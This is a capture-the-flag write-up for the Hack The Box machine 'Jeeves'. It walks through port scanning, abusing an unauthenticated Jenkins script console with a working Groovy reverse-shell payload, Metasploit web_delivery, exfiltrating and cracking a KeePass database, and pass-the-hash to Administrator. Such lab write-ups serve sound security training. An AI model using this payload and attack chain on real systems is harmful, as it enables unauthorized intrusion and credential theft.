### HTB Jeeves    10.10.10.63

Welcome to another machine.  Let's see what we're looking at it.  Nmap is your friend :)

```
(kali㉿kali)-$ sudo nmap -T4 -p- -Pn 10.10.10.63
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-12 22:46 EDT
Nmap scan report for 10.10.10.63
Host is up (0.043s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
50000/tcp open  ibm-db2

Nmap done: 1 IP address (1 host up) scanned in 94.17 seconds
```

Four ports to work with here.  80, 135, 445, and 50000.  So again, get some more info on those port.

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p 80,135,445,50000 -A 10.10.10.63
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-12 22:51 EDT
Nmap scan report for 10.10.10.63
Host is up (0.047s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
```

So after this we see that 50000 is an http site.  It's being run with Jetty.  Checking out the site itself doesn't yeild a whole lot of info.  Even trying the search gets you an error that isn't really an error, it's actually a just an image made to look like an error.  Instead of that, let's see if there are any other pages that this port is tied to.

Fire up `dirbuster` and lets see what we can find out.

![dirbuster](/Images/HTB4Jeeves/pic1.png)

Click start and let it go.  It may take some time so get a drink or a snack or something and let it do it's thing.  Once it's done, you start to see the results.  Looks like we have a directory called /askjeeves/.  Let's go see what that's all about.

![dirbusterresult](/Images/HTB4Jeeves/pic2.png)

Jenkins, ey.  So let's poke around this for a bit.  And I'm able to find a script console.  Do some google searching cause it looks like the script console runs on Groovy script.  When I go look, I find something.

```
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

So with this, I just put the script into the console, fireup netcat to listen on this port and let's give it a go!!

`nc -nvlp 8044`

![whoami](/Images/HTB4Jeeves/pic3.png)

Looks like I'm this kohsuke user.  Quick directory move over to this user's desktop and grab the user flag.  Score there.  And then back to the original directory and let's work on getting elevated to root and getting that flag.

So run a quick alteration to the `whoami` command since thats what this lesson is about.  And wouldn't ya know it, the one we need is right there.

```
C:\Users\Administrator\.jenkins>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

SeImpersonatePrivilege is enabled.  Probably a good thing since that's what this box is on, yea?

So we have our shell on a basic user.  Time to elevate.  Fire up Metasploit for this one.  And lets get this show on the road.

`msfconsole`

`use exploit/multi/script/web_delivery`

![msf exploit](/Images/HTB4Jeeves/pic4.png)

Run that and it should spit out a powershell command to copy and paste into the shell session we have on the target.  Run that it you should get the session.  No need to start a listener since we're using Metasploit cause it does all that for us.

![msf session](/Images/HTB4Jeeves/pic5.png)

Now that we have our session, we can do some more things.  Do an exploit checker to see what's vulnerable for one.

`meterpreter > run post/multi/recon/local_exploit_suggester`

![Exploit Check](/Images/HTB4Jeeves/pic6.png)

Looks like we have a decent number of vulnerabilities.  If this were a live pentest, I'm sure all of these would be tested for and checked/reported.  The one we're interested in for this box though is the reflection_juicy one.  This is the potato or token impersonation vulnerability.

So we're going to use that so we `background` out of the session, `show sessions` to verify the number and then get to using that exploit.

```
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/script/web_delivery) > use exploit/windows/local/ms16_075_reflection
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms16_075_reflection) > show options
```

![Exploit Options](/Images/HTB4Jeeves/pic7.png)

So, at this point, I hit a snag following along with the video.  I could not, for the life of me, get the potato attack to work right.  I kept getting errors about the arch type and config were not matching.  It came down to the fact that I was trying to use an x86 version of meterpreter session with an x64 exploit.  So I went looking for a different way to crack this box.  I ended up finding a pretty solid way too.

So instead of going the metasploit way, I decided to follow the manual way.

```
(kali㉿kali)-$ impacket-smbserver Folder pwd
Impacket v0.12.0.dev1 - Copyright 2023 Fortra
```

This time started an smb server on my kali device and used that to grab a file that I found.

```
C:\Users\kohsuke\Documents>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\kohsuke\Documents

11/03/2017  11:18 PM    <DIR>          .
11/03/2017  11:18 PM    <DIR>          ..
09/18/2017  01:43 PM             2,846 CEH.kdbx
               1 File(s)          2,846 bytes
               2 Dir(s)   2,526,121,984 bytes free

C:\Users\kohsuke\Documents>net use s: \\10.10.14.31\Folder
net use s: \\10.10.14.31\Folder
The command completed successfully.


C:\Users\kohsuke\Documents>copy CEH.kdbx s:
copy CEH.kdbx s:
        1 file(s) copied.
```

Now that I have that, I need to be able to crack it's password.  I do that with John, after prepping the file.

```
(kali㉿kali)-$ ls
CEH.kdbx
                                                                                                                                    
(kali㉿kali)-$ keepass2john CEH.kdbx > CEHtohack
                                                                                                                                    
(kali㉿kali)-$ ls
CEH.kdbx  CEHtohack
```

Using the following command, I was able to get this password extracted.

`john CEHtohack -w:/usr/share/wordlists/rockyou.txt`

![John Output](/Images/HTB4Jeeves/pic8.png)

Then go install KeePass on my device and use the extracted password to open the keepass db.  And wouldn't you know it, there's an administrator password hash in there.  Grab that use it along with `pth-winexe` in order to get an elevated connection to the device.

![Elevated](/Images/HTB4Jeeves/pic9.png)

```
C:\Users\Administrator>cd desktop
cd desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,650,607,616 bytes free

C:\Users\Administrator\Desktop>type hm.txt
type hm.txt
The flag is elsewhere.  Look deeper.
```

And now we ha....wait, WHAT?!  hm.txt.  And no flag....interesting.  Telling us to "look deeper".  Lets see if there is something in an alternate data stream.

```
C:\Users\Administrator\Desktop>dir /R
dir /R
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,650,607,616 bytes free
```

Ahh, an alternate data stream showing up on the .txt file.

`more < hm.txt:root.txt:$DATA`

![Root](/Images/HTB4Jeeves/pic10.png)

And there's our wonderful root flag.  While we didn't really get NT / SYSTEM AUTHORITY, we did get an Administrator (which served our purpose here just fine).  Wish the potato route would have worked but I get the understanding behind it.  I also have my notes from the videos on how to run that if I need to come back to it.

Definitely shows that there is always more than one way to tackle a box.  As I was looking for different resources, I found a number of walk throughs that almost all did them in a different way.  Just goes to show that if one tool doesn't work, try another one.  You never know what will work and what won't.

Till next time friends.  :)
